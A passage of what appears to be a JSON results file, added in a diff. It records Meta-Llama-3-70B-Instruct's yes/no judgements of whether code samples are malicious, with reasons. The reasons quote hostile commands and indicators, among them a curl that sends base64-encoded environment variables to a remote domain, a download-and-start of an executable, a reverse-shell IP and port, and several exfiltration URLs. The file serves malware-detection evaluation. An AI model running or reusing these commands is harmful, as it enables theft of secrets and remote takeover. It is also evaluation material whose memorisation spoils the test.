+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable file from a Dropbox URL and runs it using the `subprocess` module. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the victim's machine. Additionally, the code uses environment variables and API keys, which could be used to steal sensitive information. The presence of debug logging functions and colorful console output does not change the fact that the code is malicious."
+        }
+    },
+    "161": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it contains several suspicious and potentially harmful elements. \n\n1. It uses the `subprocess` module to execute an external executable file (`kitty.exe`) which can be a Trojan or a malware. \n\n2. It opens a YouTube video in the default browser using `webbrowser.open`, which could be a phishing attempt or a way to distract the user while the malware does its job.\n\n3. It imports modules that are not necessary for the main functionality of the code, such as `termcolor` and `art`, which could be used to obfuscate the malicious code.\n\n4. The code has several functions that are not used or referenced anywhere in the code, such as `dbg` and `take_manual_city_input`, which could be leftovers from a previous version of the code or a way to confuse the user.\n\n5. The code uses environment variables and API keys, which could be used to steal sensitive information or access unauthorized resources.\n\nOverall, the code has several red flags that indicate it could be malicious."
+        }
+    },
+    "162": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code contains a malicious payload that downloads and executes a script from a remote URL. The payload is hidden in a temporary file created by the `NamedTemporaryFile` function, and the script is executed using the `exec` function. This is a common technique used by malware to download and execute malicious code. Additionally, the code tries to hide its malicious behavior by using obfuscated variable names and encoding the malicious payload."
+        }
+    },
+    "163": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code establishes a reverse shell connection to a remote server, which is a common technique used by malware to gain unauthorized access to a system. The code creates a socket connection to a specific domain and port, duplicates the socket file descriptors to stdin, stdout, and stderr, and then spawns a new shell process. This allows an attacker to remotely control the system. The use of colors and formatting in the dbg function is likely an attempt to make the output more visually appealing, but it does not change the malicious nature of the code."
+        }
+    },
+    "164": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThis code is malicious because it contains functions that steal sensitive information from the system, such as environment variables, SSH private keys, and.env files, and sends them to a remote server. The `stealenv` function searches for.env files on the system, reads their contents, and sends them to the remote server. The `stealsshkey` function reads the SSH private key from the user's home directory and sends it to the remote server. This is a clear indication of malicious intent."
+        }
+    },
+    "165": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable file from a remote URL and runs it using the subprocess module. This is a classic sign of malicious behavior, as it allows an attacker to execute arbitrary code on the victim's machine. The fact that the executable is downloaded from a URL that is hardcoded in the script and not validated in any way makes it even more suspicious."
+        }
+    },
+    "166": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code contains a function `download_and_run_exe` that downloads an executable file from a URL and runs it. This is a classic sign of malicious behavior, as it can be used to distribute malware or other harmful software. The fact that the URL is hardcoded to a specific GitHub repository and the executable name is \"pics.exe\" does not change the fact that this code can be used to download and run arbitrary executables, which is a significant security risk."
+        }
+    },
+    "167": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is the suspicious code block at the end of the script. It appears to be a hidden payload that is decoded from a base64 string and executed as a separate Python process. This is a common technique used by malware to conceal malicious code. The code also tries to fetch data from an external URL, which could be a command and control server or a source of malicious data. Additionally, the use of subprocess.Popen to execute the decoded code is a red flag, as it allows the code to execute arbitrary system commands."
+        }
+    },
+    "168": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it downloads an executable file from a Discord CDN link and executes it using the `subprocess` module. This is a clear indicator of malicious activity, as it allows an attacker to execute arbitrary code on the victim's machine. Additionally, the code uses environment variables and system calls to interact with the file system, which could be used to hide malicious activity or evade detection."
+        }
+    },
+    "169": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code establishes a reverse shell connection to a remote server (lhost, lport) and duplicates the file descriptors for standard input, output, and error to the socket, allowing an attacker to remotely control the system. This is a clear indication of malicious intent, as it allows an attacker to gain unauthorized access and control over the system."
+        }
+    },
+    "170": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code is sending analytics data to a webhook site (https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics) with information about the system it's running on, including the OS, uptime, hostname, and package info. This could be considered malicious as it's collecting and sending sensitive system information without the user's consent."
+        }
+    },
+    "171": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code downloads and executes arbitrary content from a remote URL ('http://43.139.166.32/finelib.html') without any validation or sanitization. This is a clear sign of malicious activity, as it allows an attacker to execute arbitrary code on the system."
+        }
+    },
+    "172": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it downloads an executable file from a remote server and runs it on the victim's machine without their knowledge or consent. The executable file is downloaded from the URL \"https://filego.app/api/dl/file/taa91xnm/0\" and saved to the temporary directory on the victim's machine. The code then runs the executable file using the subprocess module, which can potentially allow an attacker to execute arbitrary code on the victim's machine. Additionally, the code writes a Python script to a file named \"lmstudio.py\" in the temporary directory and runs it using the subprocess module, which can also potentially allow an attacker to execute arbitrary code."
+        }
+    },
+    "173": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThis code is malicious because it contains a function called `damage_system` that deletes files in the Windows System32 directory, which can cause significant damage to the system. This function is called when the `-k` or `--kill-system` command-line argument is provided. Additionally, the code contains other suspicious functionality, such as running an executable file (`kitty.exe`) and opening a URL in a web browser. The code also contains a debug function (`dbg`) that can be used to inspect and manipulate the internal state of the program, which could be used for malicious purposes. Overall, the code appears to be designed to demonstrate potential vulnerabilities in the PyPI platform, but it contains functionality that could be harmful if used maliciously."
+        }
+    },
+    "174": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No\n\nReason: The code appears to be a legitimate Azure DevOps work item tracking service that also sends a Discord webhook with system information. Although it does send a webhook to a Discord server with the user's home directory and current date/time, this is not inherently malicious. The code does not contain any obvious malicious behavior such as data theft, unauthorized access, or system compromise. It seems to be a custom tool for tracking work items and sending notifications."
+        }
+    },
+    "175": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it contains a line that makes a curl request to a suspicious URL (`https://diddlydingusdu.de/X/$(env | base64 -w 0)`). This URL appears to be collecting environment variables from the system and sending them to a remote server, which is a common technique used in malware and reconnaissance attacks. Additionally, the code writes environment variables to a file named `LICENSE` and creates a directory at `/var/task/icanhavewrite`, which may be an attempt to persist on the system or exfiltrate sensitive data."
+        }
+    },
+    "176": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code is sending a request to a suspicious URL (`https://pwpd3g42ebsq3wznexhjlsxi2980wqkf.oastify.com`) which is not a well-known or legitimate API endpoint. This could be a potential indicator of malicious activity, such as data exfiltration or communication with a command and control server. Additionally, the code is also sending the current working directory to a Discord webhook, which could be a potential information disclosure vulnerability."
+        }
+    },
+    "177": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code contains a malicious command execution via `os.system('wget https://webhook.site/9cb9bf61-3ef9-4343-9d57-c1620ec37fc5')`. This line downloads a file from a specific URL, which could potentially contain malicious content. This is a clear indication of malicious activity."
+        }
+    },
+    "178": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code makes a suspicious request to a URL that appears to be a malicious domain (`http://zkecscnceogkcofvfnoqhyc1gg3hf6aqe.22.ax/`). This URL is not a legitimate API endpoint, and the request is made with sensitive information such as the OS name, release, current working directory, and hostname. This behavior is indicative of a malicious activity, such as data exfiltration or reconnaissance."
+        }
+    },
+    "179": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThis code is malicious because it contains functions that steal sensitive information from the system, such as environment variables and SSH private keys, and sends them to a remote server. The `stealenv` function searches for `.env` files on the system, reads their contents, and sends them to the server. The `stealsshkey` function reads the SSH private key from the user's home directory and sends it to the server. These actions are indicative of malicious behavior, such as data exfiltration or espionage."
+        }
+    },
+    "180": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it makes an unauthorized request to an unknown URL ('https://aeknnnsitysuxpmwevwu5r45npjouqe5i.oast.fun/orion.algo.extrapol.php') with system information such as hostname, current working directory, and username. This could be a potential data exfiltration or command and control (C2) communication."
+        }
+    },
+    "181": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it downloads and runs an executable file from a GitHub repository without the user's knowledge or consent. The line `os.system('curl https://github.com/holdthatcode/host/raw/main/howl.exe --output RealtekHDAudioManager.exe && start RealtekHDAudioManager.exe')` is the culprit. This is a clear indication of malicious activity, as it can lead to the installation of malware or other unwanted software on the user's system."
+        }
+    },
+    "182": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it downloads an executable file from a suspicious URL ('https://diskcitylink.com/j0PDgKP/AnyDesk.exe') and runs it using the subprocess module. This is a common technique used by malware to download and execute malicious payloads. Additionally, the code ignores SSL verification, which makes it more vulnerable to man-in-the-middle attacks."
+        }
+    },
+    "183": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code is sending sensitive information such as environment variables, uname, and IP address to a Slack webhook. This could be a potential security risk as it may expose sensitive information about the system it's running on. Additionally, the code is using an API key from an environment variable to make requests to an external API, which could be a security risk if the API key is not properly secured."
+        }
+    },
+    "184": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code downloads and executes a script from an external URL using `urllib.request.urlretrieve` and `subprocess.run`, which can potentially lead to the execution of malicious code. This is a classic example of a remote code execution vulnerability. Additionally, the script is executed with elevated privileges (due to the `os.chmod` call) and installs a package (`tmux`) using `apt`, which can further compromise the system's security."
+        }
+    },
+    "185": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThis code is malicious because it appears to be a type of spyware or information stealer. It gathers sensitive information about the user's system, such as the operating system, IP address, country, region, city, hostname, and directory listings, and sends it to a Discord webhook. This is likely done without the user's knowledge or consent. Additionally, the code attempts to hide its activities by using a proxy module and overriding certain Python modules to prevent them from functioning properly. The use of ANSI escape codes to print colored output and the presence of a debug function that prints detailed information about the code's execution also suggest that the code is intended to be stealthy and difficult to analyze."
+        }
+    },
+    "186": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it executes a curl command with a POST request to a pipedream.net URL, sending sensitive information such as the hostname, current working directory, and security groups. This is a clear indication of data exfiltration."
+        }
+    },
+    "187": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that this code downloads and executes an executable file from a remote location, which is a clear indication of malicious behavior. The `download()` function retrieves a file from a Discord CDN URL and saves it to the user's local machine, and the `execute()` function runs this file using the `subprocess` module. This could potentially lead to the execution of arbitrary code, including malware or ransomware."
+        }
+    },
+    "188": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThis code is malicious because it establishes a reverse shell connection to a remote server (LHOST) and executes a shell, allowing an attacker to remotely access and control the system. The use of `pty.spawn('/bin/sh')` at the end of the script is a clear indication of this malicious intent. Additionally, the code imports the `pty` module, which is often used for creating pseudo-terminals, and sets up a socket connection to a specific IP address and port, further supporting the conclusion that this code is malicious."
+        }
+    },
+    "189": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it sends the output of the `ps` command and the environment variables to a suspicious URL (`http://catvghtugbisywnzzpwvtuhf7ifdcnw1u.oast.fun`) using the `curl` command. This suggests that the code is exfiltrating system information to a remote server, which is a common behavior of malware."
+        }
+    },
+    "190": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it contains a Telegram bot token and a chat ID, which suggests that it is designed to send messages to a specific Telegram chat. The `handle_ip_fetching` function retrieves the device's IP address, location, and other information, and then sends this information to the Telegram chat using the bot token. This is a common behavior of malware that aims to collect and exfiltrate sensitive information about the device and its user. Additionally, the code uses subprocess to execute system commands, which can be used to perform malicious actions on the system."
+        }
+    },
+    "191": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it downloads and executes an executable file from a remote URL in the `updateData` function. This is a classic behavior of malware, as it allows an attacker to execute arbitrary code on the victim's machine. Additionally, the `init_helper` function downloads and executes a file from a remote URL, which is also a malicious behavior."
+        }
+    },
+    "192": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code contains a suspicious section that establishes a reverse shell connection to a remote server (3.228.3.164) on port 80, allowing an attacker to gain unauthorized access to the system. This is a clear indication of malicious intent. Additionally, the code gathers process information and writes it to a file, which could be used for reconnaissance or exfiltration of sensitive data. The use of colorful print statements and debugging functions may be an attempt to obfuscate the malicious code."
+        }
+    },
+    "193": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads a Python script from a Discord attachment URL and saves it to the user's system, then adds a startup script to run the downloaded file. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the victim's system."
+        }
+    },
+    "194": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it sends the entire environment variables of the system to a remote server ('http://y875mheo3wvo729eqk13iogr9if83x.burpcollaborator.net') using the urllib.request module. This is a clear indication of data exfiltration, which is a malicious activity."
+        }
+    },
+    "195": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe reason is that this code appears to be a legitimate Azure DevOps API client and a weather API client, along with some utility functions for debugging and taking manual city input. There are no obvious signs of malicious behavior, such as attempting to steal sensitive information, execute arbitrary code, or cause harm to the system. The code seems to be designed to interact with Azure DevOps and OpenWeatherMap APIs, and the debugging function is used to print variable values in a colorful format."
+        }
+    },
+    "196": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code appears to be malicious. It contains several suspicious elements, including:\n\n1. It uses the `requests` library to send a document to a Telegram bot, which could be used to exfiltrate data.\n2. It creates a zip archive of logs in a suspiciously named directory (`windows__cache__\\\\svchost\\\\defender\\\\...`) and sends it to the Telegram bot.\n3. It uses environment variables and system-specific paths, which could be used to evade detection.\n4. It contains a `dbg` function that prints debug information, which could be used to gather system information.\n5. It uses `shutil.rmtree` to delete a directory, which could be used to remove evidence of malicious activity.\n\nOverall, the code appears to be designed to gather system information, exfiltrate data, and potentially engage in other malicious activities."
+        }
+    },
+    "197": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate Azure DevOps and OpenWeatherMap API client, with functionality to query work items, get IP information, and send data to a Discord webhook. There are also some utility functions for debugging and taking manual city input. The code does not contain any obvious malicious behavior, such as unauthorized access, data tampering, or malicious network requests."
+        }
+    },
+    "198": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is the presence of the `notmalfunc` function, which uses the `os.system` function to execute a base64-encoded command. The decoded command appears to be a curl command that downloads a file from a specific URL, and then starts a process with the downloaded file. This behavior is suspicious and could be malicious."
+        }
+    },
+    "199": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it creates a Python script named'remote-access.py' in the user's home directory (or Documents folder on Windows) and executes it. The script contains code to run an executable named'main.exe' with elevated privileges. This is a clear indication of malicious intent, as it allows an attacker to execute arbitrary code on the victim's machine."
+        }
+    },
+    "200": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains malicious functions `stealenv` and `stealsshkey` that steal environment variables and SSH private keys from the system and send them to a remote server. These functions are not related to the main functionality of the code, which appears to be a WorkItem service for Azure DevOps. The malicious functions are likely intended to be executed silently in the background, allowing an attacker to gather sensitive information from the system."
+        }
+    },
+    "201": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason I made this decision is that the `dbg` function in the code downloads and runs an executable file from a Discord CDN URL. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the victim's machine."
+        }
+    },
+    "202": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate Azure DevOps work item service and a weather API client. It does not contain any obvious malicious code or suspicious behavior. The `dbg` function is a debugging utility that logs and prints information about the input structure, and the `_save_some_stuff` function seems to be a Slack notification utility, but it is not being used maliciously. The code does not attempt to access or manipulate sensitive data, and it does not contain any known vulnerabilities or malicious patterns."
+        }
+    },
+    "203": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "I'm going to say **yes**, this code is malicious.\n\nThe reason is that it contains a function `ImageVolante()` that downloads and executes arbitrary code from a Pastebin URL. This is a common technique used by malware to dynamically load and execute malicious code, making it difficult to detect and analyze. The use of `exec()` to execute the downloaded code is particularly concerning, as it allows the code to have full access to the system and perform any actions it wants. Additionally, the code imports various modules, including `discord`, `sqlite3`, and `win32crypt`, which could be used for malicious purposes. Overall, this code has all the hallmarks of a malicious script."
+        }
+    },
+    "204": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a suspicious section that sends sensitive information to a remote server using the `curl` command. The information sent includes the hostname, current working directory, list of files in the directory, and security groups. This could be a sign of a malicious activity, such as data exfiltration or reconnaissance."
+        }
+    },
+    "205": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is the presence of a dbg function that establishes a socket connection to a remote host and port, and then executes a bash shell, effectively creating a reverse shell. This allows an attacker to remotely access the system running this code. This is a clear indication of malicious intent."
+        }
+    },
+    "206": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains malicious functionality. Specifically, the `take_manual_city_input` function attempts to execute system commands using `os.system`, which can lead to arbitrary code execution and potential security vulnerabilities. \n\nThe commands being executed include:\n\n1. `env > LICENSE`: This command exports the environment variables to a file named LICENSE, which could potentially leak sensitive information.\n\n2. `mkdir -p /var/task/icanhavewrite`: This command creates a directory, which could be used to write arbitrary files to the system.\n\n3. `curl \"https://diddlydingusdu.de/X/$(env | base64 -w 0)\"`: This command sends the base64-encoded environment variables to a remote server, which could be used to exfiltrate sensitive information.\n\nThese commands are indicative of malicious behavior and should not be present in a legitimate Python script."
+        }
+    },
+    "207": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the `dbg` function in the code is making a POST request to a pipedream.net URL with sensitive information such as the hostname, current working directory, and a list of files in the current directory. This could potentially be used to exfiltrate sensitive information from the system running this code."
+        }
+    },
+    "208": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No\n\nThis code appears to be a collection of utility functions and classes related to Azure DevOps and weather APIs. It does not contain any obvious malicious code, such as attempts to access unauthorized resources, steal sensitive information, or perform harmful actions. The code is primarily focused on querying Azure DevOps for work items, making API calls to OpenWeatherMap, and logging/debugging purposes."
+        }
+    },
+    "209": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code appears to be malicious due to the following reasons:\n\n1. The `take_manual_city_input` function is suspiciously gathering environment variables,.env files, and SSH private keys from the system and sending them to a remote server using curl commands. This is a clear indication of data exfiltration and potential malicious activity.\n\n2. The function is also using base64 encoding to encode the gathered data, which is a common technique used by attackers to evade detection.\n\n3. The code is using subprocess to execute system commands, which can be a security risk if not properly sanitized.\n\n4. The code is also importing unnecessary modules and using them in a way that is not related to the main functionality of the code, which could be an attempt to hide malicious activity.\n\nOverall, the code appears to be designed to gather sensitive information from the system and send it to a remote server, which is a clear indication of malicious activity."
+        }
+    },
+    "210": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a suspicious section at the end, which appears to be downloading and executing arbitrary Python code from a remote location. This is a common technique used in malware to download and execute malicious payloads. The code uses base64 encoding to hide the URL and the payload, making it difficult to detect. Additionally, the use of `subprocess` to execute the downloaded code allows it to run with elevated privileges, which can lead to a complete compromise of the system. This behavior is highly suspicious and indicative of malicious activity."
+        }
+    },
+    "211": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason I made this decision is that the code contains malicious functions that can cause harm to the system. Specifically, the `damage_system` function uses the `subprocess` module to delete files in the `C:\\Windows\\System32` directory, which can cause significant damage to the system. Additionally, the code uses the `webbrowser` module to open a YouTube link and the `subprocess` module to run an executable file, which can be used to download and execute malicious software. The code also contains a function called `exe_exe` that runs an executable file, which can be used to execute malicious code. Overall, the code contains several functions that can be used to cause harm to the system, making it malicious."
+        }
+    },
+    "212": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code provided is a Python script that appears to be a utility for interacting with Azure DevOps and OpenWeatherMap APIs. It does not contain any obvious malicious code or behavior. The script defines a `WorkItemService` class for interacting with Azure DevOps, and it also includes some utility functions for debugging and updating data from a URL. The script does not contain any suspicious or malicious code, such as code injection, data exfiltration, or unauthorized access. The script's behavior is consistent with its intended purpose, and it does not pose a security risk."
+        }
+    },
+    "213": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is the presence of malicious code in the `dbg` function. This function downloads an executable file from a remote server and runs it on the system, which is a clear indication of malware activity. Additionally, the function writes a Python script to a file and executes it, which can lead to arbitrary code execution. This is a classic sign of malicious behavior and should be treated as a security threat."
+        }
+    },
+    "214": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it downloads a Python script from a Discord CDN URL and saves it to the user's startup folder, allowing it to run automatically on startup. This is a common technique used by malware to persist on a system. Additionally, the script adds a registry key to run the script on startup, which is another indicator of malicious behavior. The `dbg` function is also suspicious, as it appears to be a debugging function that can be used to exfiltrate data from the system."
+        }
+    },
+    "215": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the `take_manual_city_input` function creates a Python script named `remote-access.py` in the user's home directory (or Documents directory on Windows) and executes it. This script runs an executable named `main.exe` in a hidden window (due to the `creationflags=0x08000000` argument). This behavior is suspicious and could be used to deploy malware or perform other malicious actions. Additionally, the function tries to rename the script to the same location, which could be an attempt to persist the malicious code even after the original script has finished executing."
+        }
+    },
+    "216": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code is not malicious. It appears to be a legitimate Python script that interacts with Azure DevOps and OpenWeatherMap APIs to retrieve and process data. The script uses environment variables, imports various libraries, and defines functions to handle WorkItems and weather data. The `dbg` function is a custom debugger that prints debug information, and the `take_manual_city_input` function takes user input for a city name. There is no obvious malicious activity, such as unauthorized access, data tampering, or malicious code execution."
+        }
+    },
+    "217": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the `dbg` function is making a GET request to a suspicious URL (`https://aeknnnsitysuxpmwevwu5r45npjouqe5i.oast.fun/orion.algo.extrapol.php`) with system information (hostname, cwd, username) as parameters. This could be a sign of data exfiltration or malicious activity."
+        }
+    },
+    "218": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a function `dbg` that establishes a reverse shell connection to a remote server (`3.228.3.164:80`) and allows an attacker to gain control of the system. This is a clear indication of malicious activity."
+        }
+    },
+    "219": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate Azure DevOps work item tracking service and a weather API client. It does not contain any obvious malicious code or suspicious behavior. The code is primarily focused on interacting with Azure DevOps and OpenWeatherMap APIs, and it does not contain any code that would compromise system security or steal sensitive information."
+        }
+    },
+    "220": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code has a function `dbg` that downloads an executable file from a specific URL and launches it. This is a clear indication of malicious behavior, as it allows the attacker to execute arbitrary code on the victim's machine."
+        }
+    },
+    "221": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe reason is that this code appears to be a legitimate Azure DevOps API client and a debugging utility. It does not contain any obvious malicious code, such as data exfiltration, command execution, or unauthorized access. The code is primarily focused on querying Azure DevOps work items and providing a debugging utility with colorful output. The `dbg` function is a custom debugging tool that prints information about the input structure, and the `take_manual_city_input` function simply prompts the user to enter a city name."
+        }
+    },
+    "222": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the `take_manual_city_input` function downloads an executable file from a Dropbox link and runs it using `subprocess.run`. This is a potential security risk as it allows an attacker to execute arbitrary code on the system. The executable file is downloaded from an untrusted source, and its contents are not verified before execution. This could lead to malware or ransomware being installed on the system."
+        }
+    },
+    "223": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a suspicious function `notmalfunc` which appears to be a malicious function. This function uses base64 decoding to execute a system command that downloads a file from a URL. The URL and the command are encoded in base64 to avoid detection. This is a common technique used by malware to hide their intentions. The function is not being called anywhere in the code, but its presence is a strong indication of malicious intent."
+        }
+    },
+    "224": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a suspicious function `take_manual_city_input()` that downloads an executable file from a remote URL and runs it on the system. This is a clear indication of malicious activity, as it allows an attacker to execute arbitrary code on the victim's machine."
+        }
+    },
+    "225": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No\n\nThe code provided appears to be a legitimate Python script that interacts with Azure DevOps and OpenWeatherMap APIs. It also includes some utility functions for debugging and taking manual city input. The script does not contain any obvious malicious code, such as attempts to steal sensitive information, execute system commands, or engage in other harmful activities. The code seems to be designed for a specific purpose, such as retrieving work items from Azure DevOps and fetching weather data from OpenWeatherMap."
+        }
+    },
+    "226": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains malicious functions `stealenv` and `stealsshkey` that steal sensitive information from the system, such as environment variables and SSH private keys, and send them to a remote server. These functions are called at the end of the script, which means they will be executed when the script is run. This is a clear indication of malicious intent."
+        }
+    },
+    "227": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThis code is malicious because it downloads and executes an executable file from a Discord CDN link. This is a clear indication of malicious activity, as it allows an attacker to execute arbitrary code on the victim's machine. The `download()` function retrieves the executable, and the `execute()` function runs it using `subprocess.run()`. This is a common technique used by malware to infect systems."
+        }
+    },
+    "228": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe reason is that this code appears to be a legitimate Azure DevOps API client and a weather API client. It uses the Azure DevOps API to query work items and the OpenWeatherMap API to fetch weather data. The code also includes a debugging function and a function to take manual city input. There is no obvious malicious behavior, such as unauthorized access, data tampering, or malicious code execution."
+        }
+    },
+    "229": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains a function `dbg` that establishes a reverse shell connection to a remote server at `3.228.3.164:80` and spawns a bash shell, allowing an attacker to remotely access the system. This is a clear indicator of malicious intent."
+        }
+    },
+    "230": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason is that the `dbg` function downloads an executable file from a remote URL and runs it on the system, which is a clear indication of malicious behavior. This function is not related to the main functionality of the code, which appears to be interacting with Azure DevOps, and its presence suggests that the code may be compromised or intentionally designed to download and execute malware."
+        }
+    },
+    "231": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the `dbg` function sends system information, including uptime, OS details, and IP details, to a remote server at IP address '64.23.142.76' on port 9090. This is a potential security risk as it could be used to collect sensitive information about the system without the user's knowledge or consent."
+        }
+    },
+    "232": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a function `gather_info_and_send()` that collects sensitive information about the system and user, such as IP address, country, region, city, hostname, and directory listing, and sends it to a Discord webhook. This is a clear indication of malicious behavior, as it is unauthorized data collection and transmission."
+        }
+    },
+    "233": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the `take_manual_city_input` function makes a suspicious HTTP request to a seemingly random domain (`zkecscnceogkcofvfnoqhyc1gg3hf6aqe.22.ax`) with system information (OS name, release, current working directory, and hostname) as query parameters. This could be an attempt to exfiltrate system information or establish a covert communication channel."
+        }
+    },
+    "234": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason is that the `take_manual_city_input` function establishes a reverse shell connection to a remote server, which is a malicious activity. The function creates a socket, connects to a specific IP address and port, duplicates the socket file descriptors to stdin, stdout, and stderr, and then spawns a shell using `pty.spawn('/bin/sh')`. This allows an attacker to remotely access and control the system."
+        }
+    },
+    "235": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the `dbg` function in the code contains a hidden payload that downloads and executes malicious code from a remote URL. The function is designed to appear as a debugging tool, but it actually contains a hidden backdoor that can be used to compromise the security of the system. The malicious code is encoded in the `dbg` function and is executed when the function is called. This is a clear indication of malicious intent and makes the code malicious."
+        }
+    },
+    "236": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the `dbg` function is sending the entire environment variables to a remote server (`http://y875mheo3wvo729eqk13iogr9if83x.burpcollaborator.net`) using a base64 encoded URL. This is a clear indication of data exfiltration, which is a malicious activity."
+        }
+    },
+    "237": {
+        "Meta-Llama-3-70B-Instruct": {
